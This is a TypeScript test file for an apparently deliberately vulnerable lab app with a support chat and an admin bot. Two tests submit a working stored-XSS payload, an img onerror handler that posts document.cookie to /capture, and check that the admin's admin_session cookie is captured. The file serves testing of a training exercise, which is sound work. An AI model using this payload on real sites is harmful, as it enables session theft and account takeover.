import { test, describe } from 'node:test';
import { strict as assert } from 'node:assert';
import {
  loginAsUser, postWithSession, getWithSession, sleep, BASE_URL
} from './helpers';
import fetch from 'node-fetch';

/**
 * XSS tests verify:
 * 1. A stored XSS payload in a message is NOT executed on the customer side
 *    (content is escaped in the customer support page).
 * 2. The admin bot visits the chat page and the XSS payload can POST to /capture.
 * 3. The captured value can be retrieved only by the message owner.
 */

describe('Stored XSS and session capture', () => {

  test('customer support page renders message content safely (no raw HTML)', async () => {
    const session = await loginAsUser();

    // Submit a message with an XSS payload
    const xssPayload = '<script>alert(1)</script>';
    const submitRes = await postWithSession('/support', {
      subject: 'XSS safety test',
      content: xssPayload,
    }, session);
    assert.equal(submitRes.status, 200);
    const submitData = await submitRes.json() as { ok?: boolean; messageId?: string };
    assert.ok(submitData.ok, 'Message submission should succeed');

    // Fetch the customer support page and verify the content is escaped
    const pageRes = await getWithSession('/support', session);
    const pageHtml = await pageRes.text();

    // The raw <script> tag must NOT appear in the HTML
    assert.ok(
      !pageHtml.includes('<script>alert(1)</script>'),
      'Customer page must not render raw XSS payload'
    );
    // The escaped form should be present
    assert.ok(
      pageHtml.includes('&lt;script&gt;') || pageHtml.includes('alert(1)'),
      'Customer page should show escaped content'
    );
  });

  test('XSS payload in message gets delivered to capture endpoint when bot visits', async () => {
    const session = await loginAsUser();

    // Submit a capture-triggering XSS payload.
    // Uses the same payload format verified in the attack chain test.
    const submitRes = await postWithSession('/support', {
      subject: 'Integration XSS capture test',
      content: `<img src=x onerror="this.closest('[data-message-id]').dataset&&fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messageId:this.closest('[data-message-id]').dataset.messageId,value:document.cookie})})">`,
    }, session);

    const submitData = await submitRes.json() as { ok?: boolean; messageId?: string };
    assert.ok(submitData.ok, 'Message should be accepted');
    const messageId = submitData.messageId!;
    assert.ok(messageId, 'Should return a messageId');

    // Wait for the bot to visit (poll interval is 8s, give 30s)
    console.log(`    Waiting up to 30s for bot to trigger XSS capture on message ${messageId}…`);
    let captured = false;
    for (let i = 0; i < 15; i++) {
      await sleep(2000);
      const captureRes = await fetch(`${BASE_URL}/support/capture/${messageId}`, {
        headers: { Cookie: `session=${session}` },
      });
      const data = await captureRes.json() as { status?: string; value?: string };
      if (data.status === 'captured') {
        captured = true;
        console.log(`    Capture received: ${data.value}`);
        // Verify the captured value contains the admin_session cookie
        assert.ok(
          data.value?.includes('admin_session='),
          'Captured value should contain the admin_session cookie'
        );
        break;
      }
    }
    assert.ok(captured, 'XSS capture should complete within 30 seconds');
  });

  test('capture can only be retrieved by the message owner', async () => {
    // Log in as the user and get a message ID that has a capture
    const sessionA = await loginAsUser();

    const submitRes = await postWithSession('/support', {
      subject: 'Ownership test message',
      content: `<img src=x onerror="this.closest('[data-message-id]').dataset&&fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messageId:this.closest('[data-message-id]').dataset.messageId,value:document.cookie})})">`,
    }, sessionA);
    const data = await submitRes.json() as { messageId?: string };
    const messageId = data.messageId!;

    // Wait for capture
    await sleep(20000);

    // Attempt to retrieve capture without any session → 401/redirect
    const noAuthRes = await fetch(`${BASE_URL}/support/capture/${messageId}`, {
      redirect: 'manual',
    });
    assert.ok(
      [302, 303, 401].includes(noAuthRes.status),
      'Unauthenticated capture retrieval should fail'
    );
  });

});
